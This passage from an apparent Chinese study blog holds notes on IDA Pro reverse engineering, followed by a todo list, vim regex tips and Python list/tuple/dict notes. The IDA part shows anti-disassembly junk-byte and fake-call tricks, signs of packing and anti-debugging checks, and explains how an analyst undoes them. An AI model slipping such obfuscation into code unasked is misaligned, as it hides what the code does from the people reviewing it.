<p>IDA并不能帮助你轻松修改二进制文件, …, 一些顽固的用户通常会继续提出以下问题:”那么Edit &gt; Patch Program有什么用”</p>
</blockquote>
<p>哈哈哈哈, 不过, 到底是我wine的锅, 还是确实不能用这个功能<br>好像又可以了…</p>
<h2 id="IDA脚本"><a href="#IDA脚本" class="headerlink" title="IDA脚本"></a>IDA脚本</h2><ol>
<li>File &gt; Script</li>
<li>File &gt; IDC Command</li>
<li>File &gt; Python Command</li>
</ol>
<p>这一块没怎么学..略过了</p>
<h2 id="反静态分析"><a href="#反静态分析" class="headerlink" title="反静态分析"></a>反静态分析</h2><p>例子1</p>
<pre class="line-numbers language-asm"><code class="language-asm">start_:
    xor eax, eax
    test eax, eax
    jz label1
    jnz label1
    db 0E8H ; call

label1:
    xor eax, 3
    add eax, 4
    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看这里的<code>db 0E8H</code>就是junk code, 这里其实不会被执行到, 但对他编译, 再反汇编之后…会起到混淆作用</p>
<pre class="line-numbers language-asm"><code class="language-asm">xor eax, eax
test eax, eax
je xxxxxx
jne xxxxxx
call yyyyyyy ; 看这里这个junk code
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个时候需要把<code>call yyyyyy</code>这里<code>Unfined</code>, 按一下<code>U</code><br>然后再在要跳转到的<code>xxxxxx</code>这个位置<code>Code</code>, 即按一下<code>C</code><br>emmmmmmmm, 这样子</p>
<p>例子2<br>反汇编代码(修复后)</p>
<pre class="line-numbers language-asm"><code class="language-asm">    call loc_A04B0D7
    db   0C7h   ; 0x0A04B0D6
loc_A04B0D7:
    pop eax     ; (eax) = 0x0A04B0D6
    lea eax, [eax + 0Ah]    ; (eax) = 0x0A04B0E0
    db   0E8h
    jmp eax
start endp
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的call是个假的…<br>就是把返回地址ret给pop出去了, 然后若无其事的继续执行<br>后来的这个<code>jmp eax</code>里<code>eax</code>的值实际上是能确定的, 但IDA不能识别</p>
<p>这里需要修复两次一个是<code>db 0C7h</code>, 一个是<code>db 0E8h</code>…</p>
<p>先根据<code>call loc_A04B0D7</code><br>找到<code>loca_A04B0DB</code>这里重新反汇编一下<br>然后在<code>db 0E8h</code>这里原来是</p>
<pre class="line-numbers language-asm"><code class="language-asm">loc_A04B0DB:
    jmp short near ptr loc_A04B0DB + 1  ; E8 FF
start endp
db 0E0h                                 ; E0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实应该是</p>
<pre class="line-numbers language-asm"><code class="language-asm">db 0E8h     ; E8
jmp eax     ; FF E0
start endp
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>例子3 动态计算目标地址</p>
<pre class="line-numbers language-asm"><code class="language-asm">... ;寄存器之间各种计算
pop eax
pop ebx
... ;恢复现场
xchg edi, [esp]
retn
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>返回地址是动态计算出来,存到了<code>edi</code>里, 之后存到了栈顶<code>[esp]</code></p>
<ol>
<li>加壳…<br>加了壳, 尤其是UPX这样子的壳, 没办法静态分析了就<br>就要先脱壳</li>
</ol>
<p>加壳后的特征:</p>
<pre><code>1. 有非标准段名称
1. 一个或者多个程序既可以写又可以执行
1. Functions, Imports, Strins 很少有内容
</code></pre><ol>
<li><p>一般壳用到的API (windows…)</p>
<pre class="line-numbers language-c"><code class="language-c">HINSTANCE <span class="token function">LoadLibrary</span><span class="token punctuation">(</span>LPCTSTR lpLibFileName<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 根据名称加载dll, 返回句柄</span>
HMODULE   <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>LPCTSTR lpModuleName<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 获取dll句柄</span>
FARPROC   <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>
         HMODULE hModule<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// DLL模块句柄</span>
         LPCSTR  lpProcName  <span class="token comment" spellcheck="true">// 函数名</span>
         <span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先把dll加载进来, 最后获取函数<br>一般的,可能dll早已经加载进来, 那么直接获取句柄, 然后获取函数就可以了</p>
</li>
<li><p>有目的的攻击分析工具<br>woc, 这个厉害了…</p>
</li>
</ol>
<h2 id="反动态分析"><a href="#反动态分析" class="headerlink" title="反动态分析"></a>反动态分析</h2><ol>
<li>检测是在虚拟机运行还是本机运行</li>
<li>检测检查工具</li>
<li>检测调试器(反调试)</li>
</ol>
<ul>
<li>isDebuggerPresent (win)</li>
<li>ptrace (Linux)<br>这一块收藏过一篇文章, 然后再看一下</li>
</ul>
<h2 id="自己学习一丢丢C"><a href="#自己学习一丢丢C" class="headerlink" title="自己学习一丢丢C++"></a>自己学习一丢丢C++</h2><p>c++感觉会push好多东西.导致IDA里看到某些函数参数错误</p>
<p>就比如我这里的<code>cout &lt;&lt; 2 &lt;&lt; 3</code><br>转化得到的其实是<code>cout &lt;&lt; 2</code>和<code>cout &lt;&lt; 3</code><br>所以</p>
<pre class="line-numbers language-asm"><code class="language-asm">sub  esp, 8
push 2
push offset _ZSt4cout@@GLIBCXX_3_4
call __ZNSolsEi
add  esp, 10h

sub  esp, 8
push 3
push offset _ZSt4cout@@GLIBCXX_3_4
call __ZNSolsEi
add  esp, 10h
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我其实不太明白…为什么<br>这里是两个参数,只要</p>
<pre class="line-numbers language-asm"><code class="language-asm">push 2
push offset _ZSt4cout@@GLIBCXX_3_4
call __ZNSolsEi
add  esp, 8
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样子直接<br>push 8字节参数, 调用函数, <code>add esp, 8</code>就可以了,</p>
<p>为什么要先<code>sub esp, 8</code>, 然后压参, 调用, 最后算上清理参数的8个字节, 清理的时候就是<code>add esp, 10h</code>了<br>为什么呢 ==!啊啊啊</p>
<p>这个只有输入输出其实还不太复杂<br>这个string…好复杂啊…<br>就这一小节</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    string s <span class="token operator">=</span> <span class="token string">"123"</span><span class="token punctuation">;</span>
    string ss <span class="token operator">=</span> <span class="token string">"456"</span><span class="token punctuation">;</span>
    cin <span class="token operator">>></span> s<span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大概流程是</p>
<pre class="line-numbers language-asm"><code class="language-asm">..
call std::allocator<char>::allocator(void)
call 各种命名空间::basic_string()   ;初始化s
call std::allocator<char>::~allocator(void)

call std::allocator<char>::allocator(void)
call 各种命名空间::basic_string()   ;初始化ss
call std::allocator<char>::~allocator(void)

call >>(offset_cin, )

call <<(offset_cout, )

call <<(offset_cout, 2)

call 各种命名空间::~basic_string()   ;销毁s
call 各种命名空间::~basic_string()   ;销毁ss
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="F5的问题"><a href="#F5的问题" class="headerlink" title="F5的问题"></a>F5的问题</h2><p>第一次要在那个, emmmmm, 要在<code>IDA View</code>窗口 的 图表模式按下F5, 才能起作用<br>如果已经用空格切换到文字模式, 好像按下F5没用…</p>
<h2 id="defs-h"><a href="#defs-h" class="headerlink" title="defs.h"></a>defs.h</h2><p>我们提取出来的IDA里的c代码, 如果直接编译是通不过的,因为是某些东西未定义</p>
<p>这个文件,,emmmm,很有用,在IDA的plugins目录下</p>
<blockquote>
<p>This file contains definitions used by the Hex-Rays decompiler output.</p>
</blockquote>
<p>比如我们提取出IDA里的某一块逻辑出来, 这个时候会有一些比如<code>DOWRD</code>之类类型的定义, 这些定义都在这个头文件里, </p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>今天想要…把数据变成负数的时候…一时不知道怎么办<br>然后发现要先变成10进制, 然后右键选单里才有变成负数…<br>右键的时候稍微靠后一点…离的太近可能出不来</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[todo-list]]></title>
      <url>/2017/08/12/todo-list/</url>
      <content type="html"><![CDATA[<ol>
<li>关注预报名</li>
<li>我该复习啥…</li>
<li>先复习数据结构好了</li>
<li>免杀攻防 [√]</li>
<li>xss.pdf</li>
<li>IDA pro权威指南 [√]</li>
<li>leet-code有一本…</li>
<li>vim入门</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[vim入门]]></title>
      <url>/2017/08/12/vim%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>很久以前, 得到一本传说级教程,然后就看了几十页, 现在基本的可以使用,但好些时候稍有不方便,把书拿出来,看了看</p>
<h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><ol>
<li>实际行和屏幕行<br>在常用操作前加上<code>g</code>就变成了屏幕行移动, 比如<code>j</code>变成了<code>gj</code></li>
</ol>
<p>这个实际行是<code>set nu</code>出现的行号, 屏幕行的话就是如果一行比较长, 那某一行可能在屏幕上占用好几行</p>
<p><code>g0</code>和<code>g$</code>可以用在屏幕行首尾跳转, 更小的范围跳转, mark一下, 相见恨晚<br>还有<code>g^</code></p>
<ol>
<li>基于单词移动<br>下面的下一个…可能误解<br>比如<code>下一个单词开头</code>是<code>下一个 单词的开头</code><br>aaa bbb</li>
</ol>
<p><code>w</code> 下一个单词开头<br><code>e</code> 下一个单词结尾</p>
<p>下面俩是反向, 往前找<br><code>b</code> 下一个单词开头<br><code>ge</code> 下一个单词结尾…这个我好像用不了</p>
<ol>
<li><p>单词和字串<br>面向单词的操作是小写的 <code>w</code>, <code>b</code>, <code>e</code>, <code>ge</code><br>面向字串的操作是大写的 <code>W</code>, <code>B</code>, <code>E</code>, <code>GE</code><br>单词: 由字母, 数字, 下划线, 或者其他空白字符组成<br>这个定义怎么理解:<br> 这里的空白字符都是自成单词<br>字串: 由非空白字符序列组成, 以空白字符分割</p>
<pre><code>e.g. it&#39;s going too slow
</code></pre><p>这里的<code>e</code>,<code>.</code>,<code>g</code>,<code>.</code> 这是四个单词</p>
</li>
<li><p>行内查找字符<br>f{char}<br>下一个  ;<br>上一个  ,</p>
</li>
<li><p>全文查找<br>用命令/<br>下一个 n<br>上一个 N<br>取消高亮 :nohl</p>
</li>
</ol>
<ol>
<li>边界<br>iw 当前单词<br>aw 当前单词及一个空格<br>iW 当前字串<br>aW 当前字串及一个空格<br>is 当前句子<br>as 当前句子及一个空格<br>ip 当前段落<br>ap 当前段落及一个空行</li>
</ol>
<h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">body </span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#3c3c3c</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token selector">a </span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0000EE</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token selector">strong </span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#000</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>要匹配颜色值</p>
<pre><code>/#\([0-9a-fA-F]\{6}\|[0-9a-fA-F]\{3}\)
</code></pre><p>天…真的好复杂…</p>
<p>在此例中，我们用到了 3 类括号。方括号缺省具有特殊含义，因此不用转义。圆括号会按原义匹配字符(及)，因此需要转义，使其具有特殊含义。花括号也一样需要转义，不过，我们只需为开括号转义，而与之对应的闭括号则不用，因为 Vim 会推测我们的意图。圆括号的情况有所不同，无论开闭括号都必须转义</p>
<p>这里的或者<code>|</code>也转义了</p>
<p>还是不太懂为什么这里方括号不转义</p>
<p>例子摘自书… 记下记下记下</p>
<p>书里说道<code>\v</code>开启新世界大门!<br>使用了<code>\v</code> 假定除_、大小写字母以及数字 0 到 9 之外的所有字符都具有特殊含义, 所以!</p>
<pre><code>/\v#([0-9a-fA-F]{6}|[0-9a-fA-F]{3})
</code></pre><p>开心. 如果, 用<code>\x</code>的话就可以变成</p>
<pre><code>/\v#(\x{6}|\x{3})
</code></pre><p>这里的<code>#</code>没有特殊含义, 所以也可以直接用</p>
<ol>
<li>圆括号捕获子匹配<pre><code>I love Paris in the
the springtime.
</code></pre>匹配连续出现两次的相同单词<pre><code>/\v&lt;(\w+)\_s+\1&gt;
</code></pre></li>
</ol>
<p><code>\1</code>~<code>\9</code>代表第n个子匹配, <code>\0</code>代表整个匹配<br><code>&lt;&gt;</code>匹配单词边界<br><code>\_s</code>匹配空白字符或者换行</p>
<p>另外在圆括号前加上<code>%</code>表示不捕获</p>
<ol>
<li>单词边界<pre><code>the there three
</code></pre>用<code>/\vthe</code>的话…会匹配三个单词<br>如果<code>/\v&lt;the&gt;</code>就匹配<code>the</code>一个单词</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> vim </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python入门]]></title>
      <url>/2017/08/12/python%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>流畅的py-读书笔记</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="list-amp-tuple"><a href="#list-amp-tuple" class="headerlink" title="list &amp; tuple"></a>list &amp; tuple</h3><ol>
<li>列表推导<pre class="line-numbers language-python"><code class="language-python">symbols <span class="token operator">=</span> <span class="token string">'ABCD'</span>
codes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> symbol <span class="token keyword">in</span> symbols<span class="token punctuation">:</span>
 codes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
等价于<pre class="line-numbers language-python"><code class="language-python">symbols <span class="token operator">=</span> <span class="token string">'ABCD'</span>
codes <span class="token operator">=</span> <span class="token punctuation">[</span>ord<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span> <span class="token keyword">for</span> symbol <span class="token keyword">in</span> symbols<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<blockquote>
<p>其实, 这里有变量泄露的问题, 这个时候symbol会泄露到全局</p>
</blockquote>
</li>
</ol>
<p>也可以这样子, 习惯了js的,其实感觉更喜欢这样子写</p>
<pre class="line-numbers language-python"><code class="language-python">symbols <span class="token operator">=</span> <span class="token string">'ABCD'</span>
codes <span class="token operator">=</span> map<span class="token punctuation">(</span>ord<span class="token punctuation">,</span> symbols<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其实开始没想到字符串也可以for, 阔以map</p>
<blockquote>
<p>Python 会忽略代码里 []、 {} 和 () 中的换行, 一行太长的时候可以把一行拆成多行写</p>
</blockquote>
<p>emmmmmmm~, 但是如果有条件的话,比如</p>
<pre class="line-numbers language-python"><code class="language-python">symbols <span class="token operator">=</span> <span class="token string">'ABCD'</span>
codes <span class="token operator">=</span> <span class="token punctuation">[</span>ord<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span> <span class="token keyword">for</span> symbol <span class="token keyword">in</span> symbols <span class="token keyword">if</span> ord<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">127</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>等价到<code>filter</code>和<code>map</code>后, 就要用lambda表达式,像这样子</p>
<pre class="line-numbers language-python"><code class="language-python">symbols <span class="token operator">=</span> <span class="token string">'ABCD'</span>
codes <span class="token operator">=</span> filter<span class="token punctuation">(</span><span class="token keyword">lambda</span> c<span class="token punctuation">:</span> c <span class="token operator">></span> <span class="token number">127</span><span class="token punctuation">,</span> map<span class="token punctuation">(</span>ord<span class="token punctuation">,</span> symbols<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>列表推导还可以是二维的</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span>char<span class="token operator">+</span>num <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token string">'ABCD'</span> <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token string">'1234'</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li>生成器表达式<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> codes1 <span class="token operator">=</span> tuple<span class="token punctuation">(</span><span class="token punctuation">[</span>ord<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span> <span class="token keyword">for</span> symbol <span class="token keyword">in</span> symbols<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> codes1 <span class="token operator">=</span> tuple<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span> <span class="token keyword">for</span> symbol <span class="token keyword">in</span> symbols<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
上面第一个是列表推导产生了一个列表,又拿列表初始化了一个tuple<br>而下面这个就是叫生成器表达式…因为<code>tuple()</code>这已经有了圆括号,所以这里省去了生成器表达式两边的括号</li>
</ol>
<p>生成器表达式和列表推导不同的是一次产生一个元素, 表达上两边圆括号代替方括号</p>
<h3 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a>tuple</h3><p>tuple和list都能存放不同类型的元素, 除此外还有collections.deque也可以的<br>与list不同, tuple是不可变的</p>
<p>常见用法</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span> <span class="token string">'[*]%d %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>交换两数字</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>元祖拆包-元祖前加上*, 可以拆包作为函数参数</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> ord<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以方便函数返回多个值, 然后一拆包…</p>
<ol>
<li><p>collections.namedtuple<br>带字段名的tuple…</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> collections <span class="token keyword">import</span> namedtuple
<span class="token operator">>></span><span class="token operator">></span> Person <span class="token operator">=</span> namedtuple<span class="token punctuation">(</span><span class="token string">'Person'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'firstName'</span><span class="token punctuation">,</span> <span class="token string">'lastName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> haibin <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token string">'hai'</span><span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> haibin<span class="token punctuation">.</span>firstName
<span class="token string">'hai'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>切片<br>list, tuple, str等支持切片操作</p>
</li>
</ol>
<p>基本操作 [a:b:c], 其中c是步长,如果是负数,就是倒着来的</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> haibin<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token string">'haibin'</span>
<span class="token operator">>></span><span class="token operator">></span> haibin<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token string">'haibin'</span>
<span class="token operator">>></span><span class="token operator">></span> haibin<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token string">'nibiah'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以<code>[::-1]</code>可以实现Reverse的效果</p>
<p>注意的点是:<br>切片和区间操作不包括区间最后一个元素(即右边界), str[: 2] 是 不包括 str[2]的<br>比如</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">==</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个range不包括右边界10…</p>
<p>切片赋值<br>直接贴书上的例子</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> l <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> l
<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>

<span class="token operator">>></span><span class="token operator">></span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> l
<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>

<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">del</span> l<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> l
<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>

<span class="token operator">>></span><span class="token operator">></span> l<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> l
<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>

<span class="token operator">>></span><span class="token operator">></span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
TypeError<span class="token punctuation">:</span> can only assign an iterable

<span class="token operator">>></span><span class="token operator">></span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> l
<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>等号右边必须是可迭代对象,即便只有一个元素</p>
<ol>
<li><p>sort<br>list.sort 对原list排序,返回None<br>sorted 不改变原来的对象, 返回新list</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> l<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> l
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>array<br>数组, 处理较大数据,只能存储同一类型的, 看起来就比较底层比较快<br>大数据处理还会用到<code>NumPy</code>和<code>SciPy</code>库, 准备用到的时候再去学</p>
</li>
<li><p>collections.deque</p>
</li>
</ol>
<p>列表常常用来存一些相同类型的元素, 像是数组<br>而元祖更像是字段表的感觉,常存一些不同类型的</p>
<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>py里可映射类型都是dict实现的</p>
<p>dict是<code>{key: value}</code>形式, 要求<code>key</code>是<code>可散列数据结构</code></p>
<p>可散列数据结构</p>
<ul>
<li>在对象生命周期里,他的散列值不变</li>
<li>对象要实现<strong>hash</strong>()方法</li>
<li>要有<strong>qe</strong>()方法</li>
</ul>
<p>python里的不可变类型是可散列数据结构, 对于<code>tuple</code>, 要<code>tuple</code>包含的所有元素都是不可变类型的时候他才算是可散列的</p>
